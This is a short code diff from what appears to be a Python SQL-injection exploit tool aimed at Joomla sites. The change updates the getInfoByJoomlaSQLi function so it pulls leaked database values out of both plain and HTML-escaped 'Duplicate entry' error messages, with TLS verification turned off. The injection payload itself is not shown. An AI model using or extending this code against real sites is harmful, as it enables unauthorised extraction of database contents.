@@ -374,7 +374,10 @@ def getInfoByJoomlaSQLi(url, param):
     urlA=url+payload
     try:
 	result = requests.get(urlA,timeout=30,allow_redirects=True,verify=False).content
-        reg = ".*Duplicate entry \'(.*?)1\'.*"
+        if "Duplicate entry '" in result:
+	    reg = ".*Duplicate entry \'(.*?)1\'.*"
+	elif "Duplicate entry &#039" in result:	
+	    reg = ".*Duplicate entry \&\#039;(.*?)1\&\#039;.*"
         match_url = re.search(reg,result)
 	if match_url:
 	   info=match_url.group(1)
